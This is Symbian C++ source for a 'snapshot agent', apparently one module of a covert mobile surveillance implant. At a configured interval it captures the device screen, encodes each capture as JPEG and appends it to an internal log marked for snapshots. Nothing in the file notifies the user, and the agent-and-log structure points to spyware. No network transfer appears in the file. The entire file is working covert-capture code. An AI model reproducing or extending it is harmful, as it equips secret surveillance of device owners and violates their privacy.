/*
 * AgentSnapshot.cpp
 *
 *  Created on: 05/ago/2010
 *      Author: 
 */

#include <FBS.H>
#include <ICL\ImageData.h>
#include <ICL\ImageCodecData.h>
#include <ImageConversion.h>
#include <gdi.h>
#include <COEMAIN.H>
#include "AgentSnapshot.h"

CAgentSnapshot::CAgentSnapshot() :
	CAbstractAgent(EAgent_Snapshot)
	{
	// No implementation required
	}

CAgentSnapshot::~CAgentSnapshot()
	{
	delete iTimer;
	delete iScreenDevice;
	delete iBitmap;
	iWsSession.Close();
	}

CAgentSnapshot* CAgentSnapshot::NewLC(const TDesC8& params)
	{
	CAgentSnapshot* self = new (ELeave) CAgentSnapshot();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentSnapshot* CAgentSnapshot::NewL(const TDesC8& params)
	{
	CAgentSnapshot* self = CAgentSnapshot::NewLC(params);
	CleanupStack::Pop();
	return self;
	}

void CAgentSnapshot::ConstructL(const TDesC8& params)
	{
	BaseConstructL(params);
	
	TUint8* ptr = (TUint8 *)iParams.Ptr();
	TUint32 interval=0;               // time interval, in milliseconds, between screenshots
	Mem::Copy( &interval, ptr, 4);
	ptr += 4;
	TUint32 windCapt=0;				 //  0 = capture whole screen, 1 = capture only foreground window 	
	Mem::Copy(&windCapt,ptr,4 );
	
	iSecondsInterv = (interval / 1000);
	
	iWsSession.Connect();
	iScreenDevice = new(ELeave) CWsScreenDevice(iWsSession);
	iScreenDevice->Construct();

	iTimer = CTimeOutTimer::NewL(*this);
	}

void CAgentSnapshot::StartAgentCmdL()
	{
	TTime time;
	time.HomeTime();
	time += iSecondsInterv;
	iTimer->At(time);
	}

void CAgentSnapshot::StopAgentCmdL()
	{
	iTimer->Cancel();
	}

void CAgentSnapshot::TimerExpiredL(TAny* src)
	{
	TTime time;
	time.HomeTime();
	time += iSecondsInterv;
	iTimer->At(time);
	
	DoCaptureL();
	
	RBuf8 buf(GetImageBufferL());
	buf.CleanupClosePushL();
	if (buf.Length() > 0)
		{
			//__FLOG_HEXDUMP(buf.Ptr(), buf.Length());
			TSnapshotAdditionalData additionalData;
		
			CLogFile* logFile = CLogFile::NewLC(iFs);
			logFile->CreateLogL(LOGTYPE_SNAPSHOT, &additionalData);
			logFile->AppendLogL(buf);
			logFile->CloseLogL();
			CleanupStack::PopAndDestroy(logFile);
		}
	CleanupStack::PopAndDestroy(&buf);
	 
	}

void CAgentSnapshot::DoCaptureL()
    {
	
	TPixelsTwipsAndRotation sizeAndRotation;
	iScreenDevice->GetScreenModeSizeAndRotation(iScreenDevice->CurrentScreenMode(), sizeAndRotation);

	delete iBitmap;
	iBitmap = 0;
	iBitmap = new (ELeave) CFbsBitmap();
	iBitmap->Create(sizeAndRotation.iPixelSize, iScreenDevice->DisplayMode());
	iBitmap->SetSizeInTwips(iScreenDevice);
	TInt err = iScreenDevice->CopyScreenToBitmap(iBitmap);
	if (err == KErrNone)
		iCapturedScreen = ETrue;
	
	}

HBufC8* CAgentSnapshot::GetImageBufferL()
	{
		if (!iCapturedScreen)
			return HBufC8::NewL(0); 

		CFrameImageData* frameImageData = CFrameImageData::NewL();
		CleanupStack::PushL(frameImageData);
		TJpegImageData* imageData = new (ELeave) TJpegImageData();
		imageData->iSampleScheme  = TJpegImageData::EColor444;
		imageData->iQualityFactor = 80; // = low, set 90 for normal or 100 for high //TODO: modify accordingly HBufC8 size into GetImageBufferL!
		frameImageData->AppendImageData(imageData);
				
		HBufC8* imageBuf = NULL;
		CImageEncoder* iencoder  = CImageEncoder::DataNewL(imageBuf,_L8("image/jpeg"),CImageEncoder::EOptionAlwaysThread);
		CleanupStack::PushL(iencoder);
		TRequestStatus aStatus = KErrNone; 
		iencoder->Convert( &aStatus, *iBitmap, frameImageData );
		User::WaitForRequest( aStatus );
		CleanupStack::PopAndDestroy(iencoder);
				
		CleanupStack::PopAndDestroy(frameImageData);

		// this is just to be sure: if iWsSession is closed before iBitmap is deleted, a panic FBSLIB reason 2 is raised!
		delete iBitmap;
		iBitmap = NULL;
		
		return imageBuf;
		
	}

